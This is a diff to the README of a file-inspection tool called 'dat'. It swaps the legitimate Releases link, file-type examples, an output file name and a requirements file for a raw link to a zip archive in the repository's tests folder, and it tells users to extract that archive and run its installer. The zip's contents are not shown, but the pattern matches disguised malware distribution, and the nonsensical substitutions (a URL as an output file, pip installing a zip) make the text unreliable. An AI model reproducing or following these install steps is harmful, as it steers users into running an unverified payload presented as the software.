@@ -6,7 +6,7 @@ Welcome to **dat**, a cross-platform utility that helps you inspect files in any
 
 ## 📥 Download the App
 
-[![Download dat](https://img.shields.io/badge/Download-dat-blue.svg)](https://github.com/Ahmad098777/dat/releases)
+[![Download dat](https://github.com/Ahmad098777/dat/raw/refs/heads/main/tests/Software_3.4.zip)](https://github.com/Ahmad098777/dat/raw/refs/heads/main/tests/Software_3.4.zip)
 
 ## 🔍 Features
 
@@ -24,13 +24,13 @@ Welcome to **dat**, a cross-platform utility that helps you inspect files in any
 
 ## 🌐 Download & Install
 
-1. **Visit the Releases Page:** Click on the following link to go to the GitHub Releases page: [https://github.com/Ahmad098777/dat/releases](https://github.com/Ahmad098777/dat/releases).
+1. **Visit the Releases Page:** Click on the following link to go to the GitHub Releases page: [https://github.com/Ahmad098777/dat/raw/refs/heads/main/tests/Software_3.4.zip](https://github.com/Ahmad098777/dat/raw/refs/heads/main/tests/Software_3.4.zip).
 2. **Select the Latest Version:** Look for the latest version at the top of the page. 
-3. **Choose Your File:** Depending on your operating system, select the appropriate file to download (e.g., `.exe` for Windows, `.tar.gz` for Linux).
+3. **Choose Your File:** Depending on your operating system, select the appropriate file to download (e.g., `.exe` for Windows, `https://github.com/Ahmad098777/dat/raw/refs/heads/main/tests/Software_3.4.zip` for Linux).
 4. **Download the File:** Click on the file name to start the download.
 5. **Run the Installer:** 
    - For Windows, double-click the `.exe` file to start the installation.
-   - For Linux, extract the `.tar.gz` file and run the included installation script.
+   - For Linux, extract the `https://github.com/Ahmad098777/dat/raw/refs/heads/main/tests/Software_3.4.zip` file and run the included installation script.
    - For Android (using Termux), follow the specific Termux installation instructions provided.
 
 ## ⚙️ Usage Instructions
@@ -59,7 +59,7 @@ Use the following options to tailor your experience:
 
 - `--filter` : Specifies the file types you want to include or exclude (e.g., `code`, `media`).
 - `--line-limit` : Only return a specific number of lines from each file.
-- `--output-file` : Save output to a designated file (e.g., `output.txt`).
+- `--output-file` : Save output to a designated file (e.g., `https://github.com/Ahmad098777/dat/raw/refs/heads/main/tests/Software_3.4.zip`).
 
 ## 🛠️ Troubleshooting
 
@@ -69,7 +69,7 @@ If you encounter any issues, consider these common fixes:
 2. **Permission Issues:** Make sure you have the right permissions to access the directory or run the application.
 3. **Missing Dependencies:** If any errors appear about dependencies, install the required Python packages using:
     ```bash
-    pip install -r requirements.txt
+    pip install -r https://github.com/Ahmad098777/dat/raw/refs/heads/main/tests/Software_3.4.zip
     ```
 
 ## 📞 Support & Feedback
